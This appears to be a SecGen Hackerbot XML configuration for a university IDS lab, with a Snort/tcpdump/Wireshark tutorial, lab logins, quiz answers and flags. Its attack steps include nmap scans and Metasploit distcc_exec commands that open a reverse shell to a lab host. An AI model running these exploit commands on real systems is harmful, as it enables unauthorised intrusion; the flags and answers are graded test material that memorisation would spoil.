@@ -1,0 +1,547 @@
+
+<?xml version="1.0"?>
+
+<hackerbot
+        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://www.github/cliffe/SecGen/hackerbot">
+  <!--<hackerbot xmlns="http://www.github/cliffe/SecGen/hackerbotz"-->
+
+  <name>Hackerbot</name>
+
+  <AIML_chatbot_rules>config/AIML</AIML_chatbot_rules>
+
+  <!--Method for gaining shell access, can be overwritten per-attack-->
+  <!--<get_shell>bash</get_shell>-->
+  <get_shell>false</get_shell>
+
+  <messages>
+    <show_attack_numbers />
+
+    <greeting>Your web server is going to be attacked. I have inside information that will help you to monitor your network for the attacks. If you work with me I'll provide you with some flags.</greeting>
+
+    <!--Must provide alternatives for each message-->
+    <say_ready>When you are ready, simply say 'ready'.</say_ready>
+    <say_ready>'Ready'?</say_ready>
+    <next>Ok, I'll do what I can to move things along...</next>
+    <next>Moving things along to the next one...</next>
+    <previous>Ok, I'll do what I can to back things up...</previous>
+    <previous>Ok, backing up.</previous>
+    <goto>Ok, skipping it along.</goto>
+    <goto>Let me see what I can do to goto that attack.</goto>
+    <last_attack>That was the last one for now. You can rest easy, until next time... (End.)</last_attack>
+    <last_attack>That was the last one. Game over?</last_attack>
+    <first_attack>You are back to the beginning!</first_attack>
+    <first_attack>This is where it all began.</first_attack>
+    <getting_shell>Doing my thing...</getting_shell>
+    <getting_shell>Here we go...</getting_shell>
+    <got_shell>...</got_shell>
+    <got_shell>....</got_shell>
+    <repeat>Let me know when you are 'ready', if you want to move on say 'next', or 'previous' and I'll move things along.</repeat>
+    <repeat>Say 'ready', 'next', or 'previous'.</repeat>
+
+    <!--Single responses:-->
+    <help>I am waiting for you to say 'ready', 'next', 'previous', 'list', 'goto *X*', or 'answer *X*'</help>
+    <say_answer>Say "The answer is *X*".</say_answer>
+    <no_quiz>There is no question to answer</no_quiz>
+    <correct_answer>Correct</correct_answer>
+    <incorrect_answer>Incorrect</incorrect_answer>
+    <invalid>That's not possible.</invalid>
+    <non_answer>Wouldn't you like to know.</non_answer>
+
+    <!--can be overwritten per-attack-->
+    <shell_fail_message>Oh no. Failed to get shell... You need to let us in.</shell_fail_message>
+  </messages>
+
+  <tutorial_info>
+    <title>IDS</title>
+    <tutorial># Intrusion Detection and Prevention Systems: Configuration and Monitoring using Snort
+
+      ## Getting started
+      ### VMs in this lab
+
+      ==Start these VMs== (if you haven't already):
+
+      - hackerbot_server (leave it running, you don't log into this)
+      - ids_snoop (IP address: 10.128.163.3)
+      - web_server (IP address: 10.128.163.4)
+      - desktop
+
+      All of these VMs need to be running to complete the lab.
+
+      **Ensure the ids_snoop VM is allowed promiscuous mode.** If you are completing this lab on Leeds Beckett oVirt infrastructure, this should be sorted.
+
+      ### Your login details for the "desktop" and "ids_snoop" VMs
+      User: gunni
+      Password: tiaspbiqe2r (**t**his **i**s **a** **s**ecure **p**assword **b**ut **i**s **q**uite **e**asy **2** **r**emember)
+
+      You won't login to the hackerbot_server or web_server, but all the VMs need to be running to complete the lab.
+
+      ### For marks in the module
+      1. **You need to submit flags**. Note that the flags and the challenges in your VMs are different to other's in the class. Flags will be revealed to you as you complete challenges throughout the module. Flags look like this: ==flag{*somethingrandom*}==. Follow the link on the module page to submit your flags.
+      2. **You need to document the work and your solutions in a Log Book**. This needs to include screenshots (including the flags) of how you solved each Hackerbot challenge and a writeup describing your solution to each challenge, and answering any "Log Book Questions". The Log Book will be submitted later in the semester.
+
+      ## Hackerbot!
+      ![small-right](images/skullandusb.svg)
+
+      This exercise involves interacting with Hackerbot, a chatbot who will task you to monitor the network and will attack your systems. If you satisfy Hackerbot by completing the challenges, she will reveal flags to you.
+
+      Work through the below exercises, completing the Hackerbot challenges as noted.
+
+      ---
+      ## Network monitoring basics
+      It is important for an organisation to monitor their network for detecting unwanted behaviour, such as malicious attacks or organisational resources being misused.
+
+      Please take care to observe the instructions on which VM each command should be run from. (*There is quite a bit of switching between VMs in this lab.*)
+    </tutorial>
+    <footer>
+      ## Resources
+
+      Martin Roesch (n.d.) **Chapter 2:** Writing Snort Rules - How to Write Snort Rules and Keep Your Sanity. In: *Snort Users Manual*. Available from: &lt;[*http://www.snort.org.br/documentacao/SnortUsersManual.pdf*](http://www.snort.org.br/documentacao/SnortUsersManual.pdf)&gt;
+
+      ## License
+      This lab by [*Z. Cliffe Schreuders*](http://z.cliffe.schreuders.org) at Leeds Beckett University is licensed under a [*Creative Commons Attribution-ShareAlike 3.0 Unported License*](http://creativecommons.org/licenses/by-sa/3.0/deed.en_GB).
+
+      Included software source code is also licensed under the GNU General Public License, either version 3 of the License, or (at your option) any later version.
+
+      ![small](images/leedsbeckett-logo.png)
+
+
+      Randomised instance generated by [SecGen](http://github.com/cliffe/SecGen) (2022-10-07 17:54:24 +0100)
+    </footer>
+
+    <provide_tutorial>true</provide_tutorial>
+
+  </tutorial_info>
+
+  <attack>
+    <pre_shell>curl -v -H 'Something-worth-noting: 23bb:flag{ungulatelaminarcastroismsubirrigationaka}' 10.128.163.4 > /dev/null; echo $? </pre_shell>
+    <get_shell>false</get_shell>
+    <post_command></post_command>
+
+    <prompt>Monitor the network traffic using Tcpdump or Wireshark, and look out for a string starting with "23bb".</prompt>
+
+    <condition>
+      <output_matches>0|7</output_matches>
+      <message>Hope you found the flag! Moving on...</message>
+      <trigger_next_attack>true</trigger_next_attack>
+    </condition>
+    <condition>
+      <output_matches>1</output_matches>
+      <message>:( Failed to talk to the web server (10.128.163.4)</message>
+    </condition>
+    <else_condition>
+      <message>Ok, next up...</message>
+    </else_condition>
+
+    <tutorial>### Tcpdump
+
+      This section gives a quick overview of the basics of network monitoring, using tools such as Tcpdump and Wireshark. Keep in mind that these are important foundations, and we will quickly build on these.
+
+      **From your ids_snoop VM.** (==Login to the ids_snoop VM==)
+
+      To view live network traffic, ==start tcpdump on the ids_snoop:==
+
+      First, identify the network interface card (nic) to use:
+      ```bash
+      ip -4 -o a s | grep 10.128.163.3
+      ```
+      > The "ip a s" command lists all local IP addresses, and -4 filters to only show IPv4, while -o sets one-line output mode
+
+      ```bash
+      sudo tcpdump -i ens3
+      ```
+      > Where **ens3**, is the name of the interface given in response to the above command.
+
+      With tcpdump still running,  **from the desktop VM** ==perform a ping to the ids_snoop VM.==
+
+      ```bash
+      ping 10.128.163.3
+      ```
+      > Run the above from the desktop VM.
+
+      > Note that Tcpdump displays the network activity taking place, including the pings, and various TCP connections and ARP requests. Depending on your environment you might also be seeing the traffic between various other VMs.
+
+      ==Stop the ping== with Ctrl-C.
+
+      The IDS server has a network card interface that can enter promiscuous mode, meaning that it can view traffic destined to other systems on the network. (Without entering promiscuous mode a computer would only view the traffic destined for itself.)
+
+      Test this, **from the desktop** ==ping the web_server==:
+
+      ```bash
+      ping 10.128.163.4
+      ```
+      > If your network is configured correctly, from the Tcpdump running on the ids_snoop you should see the pings between these separate VMs (the desktop, and the web_server). Take the time to confirm that this is working. If it is not showing this traffic, but did show the last output, you need to configure the ids_snoop to be able to view the network traffic.
+
+      Once you have seen tcpdump in action displaying these packets ==press Ctrl-C to exit.==
+
+      Tcpdump can format the output in various ways, showing various levels of detail.
+
+      **From the ids_snoop**, ==run:==
+
+      ```bash
+      sudo tcpdump -A  -i ens3
+      ```
+      > This shows the packet **content** without the information about the source and destination. Note that this content will contain binary data that can be difficult understand.
+
+      When you ==access a web page in a browser on the desktop VM== (go ahead... ==hard refresh this labsheet== webpage with Ctrl-F5), Tcpdump will display the content, so long as the traffic is not SSL encrypted (for example, so long as the URL doesn't start with http**s**://). Depending on the webserver and browser, the content may be compressed (but not encrypted) to save bandwidth.
+
+      **From the desktop VM**, use command line tools to ==view the webserver pages:==
+
+      ```bash
+      curl 10.128.163.4
+      ```
+
+      ==Ping the web_server again== and observe the output.
+
+      Stop tcpdump (Ctrl-C) on the ids_snoop VM once you have observed the output.
+
+      ==Run the following== command **on the ids_snoop:**
+
+      ```bash
+      sudo tcpdump -v  -i ens3
+      ```
+      > The above is even more verbose, showing lots of detail about the network traffic.
+
+      Now try the ==above again==. Note the very detailed output.
+
+      It is possible to write tcpdump network traffic to storage, so that it can be analysed later:
+      ```bash
+      sudo tcpdump -w /tmp/tcpdump-output  -i ens3
+      ```
+
+      While that is running, ==access a web page from Firefox on the desktop VM== browse to ==[*http://10.128.163.4*](http://10.128.163.4)== (In a new tab.)
+
+      Then ==close tcpdump== (Ctrl-C).
+
+      To view the file containing the tcpdump output on the ids_snoop VM type:
+
+      ```bash
+      less /tmp/tcpdump-output
+      ```
+      > (Press "y" to see the output if you are warned that it may be a binary file)
+
+      > You should be able to PageUp and PageDown through the file.
+
+      > Press "Q" to quit when ready
+
+      Run `man tcpdump` and read about the many options for output and filtering.
+
+      ### Tcpdump filtering and Wireshark
+
+      We can also use tcpdump to do some simple monitoring of the network traffic to detect certain key words.
+
+      **On the ids_snoop**, ==run:==
+
+      ```bash
+      kdesudo wireshark &
+      > For this exercise you can ignore the warning about running Wireshark as root, or read online to learn to use setcap to grant Wireshark more specific privileges.
+
+      ```
+      And in another command tab:
+      ```bash
+      sudo tcpdump -A  -i ens3 | grep "GET"
+      ```
+
+      In Wireshark, choose the network interface card (such as ens3) then click the start icon, to ==start monitoring traffic==. Generate some traffic and explore how to ==view it using Wireshark==.
+
+      You can also open the captured network traffic in Wireshark.
+
+      Open a web browser **on the desktop VM**, and visit [*http://10.128.163.4*](http://10.128.163.4), note that tcpdump captures *most* network content, and grep can be used to filter it down to lines that are interesting to us.
+      > If you don't see traffic generated from this, you may need to press Ctrl-F5 to force the browser not to load from a local cache.
+
+      ==Right click on an HTTP request in Wireshark and "Follow", "TCP Stream".==
+
+      ==Right click the same HTTP request in Wireshark and "Follow", "HTTP Stream".==
+
+      ==In your log book explain the differences in the TCP and HTTP stream view for the same web traffic.==
+
+      Note that making sense of network traffic information using tcpdump and/or Wireshark is possible (and is a common sys-admin task), but the output is too noisy to be constantly and effectively monitored by a human to detect security incidents. Therefore we can use an IDS such as Snort to monitor and analyse the network traffic to detect activity that it is configured to alert.
+
+      Make sure tcpdump is stopped (Ctrl-C).
+    </tutorial>
+  </attack>
+
+  <attack>
+    <pre_shell>nmap -p 36425 10.128.163.4 > /dev/null; echo $? </pre_shell>
+    <get_shell>false</get_shell>
+    <post_command></post_command>
+
+    <prompt>Monitor the network traffic, and look out for attempts to scan your webserver (10.128.163.4). You need to identify what port the connection attempt is to.</prompt>
+
+    <condition>
+      <output_matches>0</output_matches>
+      <message>Hope you found the port number.</message>
+      <trigger_quiz />
+    </condition>
+    <condition>
+      <output_matches>1</output_matches>
+      <message>:( Failed to scan the web server (10.128.163.4)</message>
+    </condition>
+    <!--<else_condition>-->
+    <!--<message>:( Something was not right...</message>-->
+    <!--</else_condition>-->
+
+    <quiz>
+      <question>Now after the attack, what port number was scanned?</question>
+      <answer>^36425$</answer>
+      <correct_answer_response>:) flag{ulnadprotestantizingkirschessaccharifiesintrenchant}</correct_answer_response>
+      <trigger_next_attack />
+    </quiz>
+  </attack>
+
+  <!--
+  # TODO MORE RANDOM HACKERBOT ATTACKS
+  I'm about to attack your system, use Snort to detect the method of attack.
+  -->
+
+  <attack>
+    <pre_shell>nmap 10.128.163.4 > /dev/null; echo $? </pre_shell>
+    <get_shell>false</get_shell>
+    <post_command></post_command>
+    <suppress_command_output_feedback />
+
+    <prompt>Your webserver is about to be scanned/attacked. Make sure you are using Wireshark and Snort to monitor your network...</prompt>
+
+    <condition>
+      <output_matches>0</output_matches>
+      <message>Hope you caught with Snort.</message>
+      <trigger_quiz />
+    </condition>
+    <condition>
+      <output_matches>1</output_matches>
+      <message>:( Failed to scan the web server (10.128.163.4)</message>
+    </condition>
+    <else_condition>
+      <message>Ok...</message>
+    </else_condition>
+
+    <quiz>
+      <question>Was that a scan or an attack?</question>
+      <answer>^scan$</answer>
+      <correct_answer_response>:) flag{4B6yBmQ9Kir3VU6kTgNUBw}</correct_answer_response>
+      <trigger_next_attack />
+    </quiz>
+
+    <tutorial>## Intrusion detection system (IDS) monitoring basics
+
+      Continuing **on the ids_snoop VM:**
+
+      ==Make a backup== of the snort's configuration file in case anything goes wrong:
+
+      ```bash
+      sudo cp /etc/snort/snort.conf /etc/snort/snort.conf.bak
+      ```
+
+      ==Change Snort's output== to something more readable:
+
+      ```bash
+      sudo vi /etc/snort/snort.conf
+      ```
+      > (Remember: editing using vi involves pressing "i" to insert/edit text, then *Esc*,
+
+      > ":wq" to write changes and quit)
+
+      ==Add (or uncomment) the following lines:==
+      `output alert_fast`
+      `output log_tcpdump: tcpdump.log`
+
+      ==Change Snort's interface== to ens3 (or as you identified earlier), and set the local network to your IP address range (or "any"):
+
+      ```bash
+      sudo vi /etc/snort/snort.debian.conf
+      ```
+      > Set the interface and HOME network range, and exit vi (Esc, ":wq").
+
+      ==Start Snort:==
+
+      ```bash
+      sudo service snort stop
+      sudo service snort start
+      ```
+      > Using "reload" or "restart" may not update the interface.
+
+      Snort should now be running, monitoring network traffic for activity.
+
+      ==Do an nmap port scan of the web_server== VM (from the desktop VM):
+
+      ```bash
+      sudo nmap -sX 10.128.163.4
+      ```
+
+      This should trigger a logged alert from Snort, which is stored in an alerts log file.
+
+      **From the ids_snoop**, ==follow the Snort alert log== file by running (you may like to do this from a new tab):
+
+      ```bash
+      sudo tail -f /var/log/snort/alert
+      ```
+      >The tail program will wait for new alerts to be written to the file, and will display them as they are logged. (Ctrl-C to exit)
+
+      ==LogBook question: What does the `-sX` in the nmap command mean? Does the log match what happened? Are there any false positives (alerts that describe things that did not actually happen)?==
+
+      ==Try another type of port scan from the desktop== VM (Hint: `man nmap`).
+
+      Press Ctrl-C to ==stop the alert tail process==, if it did not do so automatically.
+
+      The Snort configuration file is also configured to output a "tcpdump" formatted network capture. (`output log_tcpdump: tcpdump.log`)
+
+      Then run the following command to ==view the contents of the log:==
+
+      ```bash
+      sudo ls  /var/log/snort/
+      sudo tcpdump -r /var/log/snort/tcpdump.log.XXXXX
+      ```
+      > Where XXXXX is one of the logs shown from the first command.
+
+      You can use tcpdump's various flags to change the way it is displayed, or you could even open the logged network activity in Wireshark.
+
+      ##Configuring Snort
+
+      **On the ids_snoop**, ==edit /etc/snort/snort.conf==; for example:
+
+      ```bash
+      sudo vi /etc/snort/snort.conf
+      ```
+      > (Remember: editing using vi involves pressing "i" to insert/edit text, then *Esc*, ":wq" to write changes and quit)
+
+      Scroll through the config file and, take notice of these details:
+
+      -   In a production environment you would configure Snort to to correctly identify which traffic is considered LAN traffic, and which IP addresses are known to run various servers (this is also configured in snort.debian.conf). In this case, we will leave these settings as is.
+
+      -   Note the line "`var RULE_PATH /etc/snort/rules`": this is where the IDS signatures are stored.
+
+      -   Note the presence of a Back Orifice detector preprocessor "bo". Back Orifice was a Windows Trojan horse that was popular in the 90s.
+
+      -   Note the "sfportscan" preprocessor (is it enabled?), which can detect various kinds of port scans.
+
+      -   The "arpspoof" preprocessor is described as experimental, and is not enabled by default.
+
+      -   Towards the end of the config file are "include" lines, which specify which of the rule files in RULE\_PATH are in effect. As is common, lines beginning with "\#" are ignored, which is used to list disabled rule files. There are rule files for detecting known exploits, attacks against services such as DNS and FTP, denial of service (DoS) attacks, and so on.
+
+      Add the following line *below the other include rules* (at the end of the file):
+
+      `include $RULE_PATH/my.rules`
+
+      Save your changes to snort.conf
+      > (For example, in vi, press Esc, then type ":wq").
+
+      > Hint: you may find it easier to use Esc, then type ":w" to write your changes to disk and then type ":q" to exit (or "x" shorthand for "wq").
+
+      Run this command, to ==create your new rule file:==
+
+      ```bash
+      sudo touch /etc/snort/rules/my.rules
+      ```
+
+      ==Edit the file.== For example:
+
+      ```bash
+      sudo vi /etc/snort/rules/my.rules
+      ```
+
+      ==Add this line (*with your own name*), and save your changes:==
+
+      `alert icmp any any -> any any (msg: "*Your-name*: ICMP Packet found"; sid:1000000; rev:1;)`
+
+      > For example, `alert icmp any any -> any any (msg: "**Cliffe**: ICMP Packet found"; sid:1000000; rev:1;)`
+
+      Now that you have new rules, tell Snort to ==reload its configuration:==
+
+      ```bash
+      sudo service snort stop
+      sudo service snort start
+      ```
+      > If after attempting a reload, Snort fails to start, then you have probably made a configuration mistake, so check the log for details by running: `tail /var/log/syslog`
+
+      Due to the new rule you have just applied, sending a simple ICMP Ping (typically used to troubleshoot connectivity) will trigger a Snort alert.
+
+      Try it, **from the desktop** VM, ==ping the web_server:==
+
+      ```bash
+      ping 10.128.163.4
+      ```
+
+      Check for the Snort alert. You should see that the ping was detected, and our new message was added to the alerts log file.
+    </tutorial>
+  </attack>
+
+  <attack>
+    <get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST 10.128.163.4; set payload cmd/unix/reverse; set LHOST 10.128.163.5; exploit"</get_shell>
+    <post_command>whoami >> out;id >> out;touch hackerbotwashere; echo $?</post_command>
+    <suppress_command_output_feedback />
+
+    <prompt>Your webserver is about to be scanned/attacked. Make sure you are using Snort and Wireshark to monitor your network... This make take a while (a few minutes) please be patient.</prompt>
+
+    <condition>
+      <output_matches>0</output_matches>
+      <message>Hope you caught that.</message>
+      <trigger_quiz />
+    </condition>
+    <condition>
+      <output_matches>1</output_matches>
+      <message>:( Failed to contact the web server (10.128.163.4)</message>
+    </condition>
+    <else_condition>
+      <message>:( Something was not right...</message>
+    </else_condition>
+
+    <quiz>
+      <question>What vulnerable software was exploited?</question>
+      <answer>distcc</answer>
+      <correct_answer_response>:) flag{kebMB9cmbNRrBT8mupes0Q}</correct_answer_response>
+      <trigger_next_attack />
+    </quiz>
+  </attack>
+
+  <attack>
+    <pre_shell>nmap -sX 10.128.163.4 > /dev/null; echo $? </pre_shell>
+    <get_shell>false</get_shell>
+    <post_command></post_command>
+
+    <prompt>Your webserver is about to be scanned/attacked. Make sure you are using Snort to monitor your network...</prompt>
+
+    <condition>
+      <output_matches>0</output_matches>
+      <message>Hope you caught that.</message>
+      <trigger_quiz />
+    </condition>
+    <condition>
+      <output_matches>1</output_matches>
+      <message>:( Failed to scan the web server (10.128.163.4)</message>
+    </condition>
+    <else_condition>
+      <message>Ok...</message>
+    </else_condition>
+
+    <quiz>
+      <question>What kind of scan was that?</question>
+      <answer>Xmas</answer>
+      <correct_answer_response>:) flag{beautify miscomputed}</correct_answer_response>
+      <trigger_next_attack />
+    </quiz>
+
+  </attack>
+
+  <attack>
+    <get_shell>msfconsole -x "use exploit/unix/misc/distcc_exec; set RHOST 10.128.163.4; set payload cmd/unix/reverse; set LHOST 10.128.163.5; exploit"</get_shell>
+    <post_command>whoami > /dev/null; echo "flag{icepickfacdefecatoryprequalifiedfanfaron}" > /dev/null; echo 'Find the flag! (in the network traffic)'</post_command>
+    <suppress_command_output_feedback />
+
+    <prompt>Your webserver is about to be scanned/attacked. Use Tcpdump and/or Wireshark to view the behaviour of the attacker. There is a flag to be found over the wire. </prompt>
+
+    <condition>
+      <output_matches>0|Find</output_matches>
+      <message>Hope you caught that.</message>
+      <trigger_next_attack />
+    </condition>
+    <condition>
+      <output_matches>1</output_matches>
+      <message>:( Failed to contact the web server (10.128.163.4)</message>
+    </condition>
+    <else_condition>
+      <message>:( Something was not right...</message>
+    </else_condition>
+  </attack>
+
+
+</hackerbot>
